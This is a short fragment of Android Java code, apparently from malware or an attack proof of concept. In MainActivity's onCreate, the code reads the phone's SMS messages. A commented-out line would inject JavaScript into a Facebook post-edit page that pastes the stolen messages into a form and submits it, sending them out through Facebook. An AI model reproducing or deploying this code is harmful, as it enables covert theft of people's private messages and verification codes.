...
public class MainActivity extends Activity
{
	...
	protected void onCreate(Bundle savedInstanceState) {
		...
		String ok = receiver.getSms(this);
		...
		//setContentView(receiver.xfbPayload(this, "javascript:document.forms[1].p_text.value='"+ok+"';" +"document.forms[1].submit()", "https://free.facebook.com/edit/post/dialog/?cid=S%3A_I846527762137977%3A1088385011285583&ct=2&nodeID=m_story_permalink_view&redir=%2Fstory.php%3Fstory_fbid%3D1088385011285583%26id%3D846527762137977%26__tn__%3D%252AW-R&perm&loc=permalink&refid=52&__tn__=-R"));
